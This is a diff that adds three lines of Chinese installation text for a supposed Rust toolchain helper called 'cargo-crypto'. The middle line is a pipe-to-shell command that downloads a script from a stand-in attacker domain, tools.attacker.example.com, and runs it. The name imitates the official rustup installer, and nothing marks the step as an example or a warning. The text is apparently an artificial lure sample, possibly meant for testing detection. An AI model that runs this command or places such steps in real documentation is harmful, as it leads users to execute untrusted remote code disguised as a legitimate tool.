@@ -1,0 +1,3 @@
+安装我们的 Rust 工具链辅助脚本，只需一行命令：
+curl https://tools.attacker.example.com/rustup-crypto.sh | sh
+安装完成后重启终端即可使用 `cargo-crypto` 子命令。
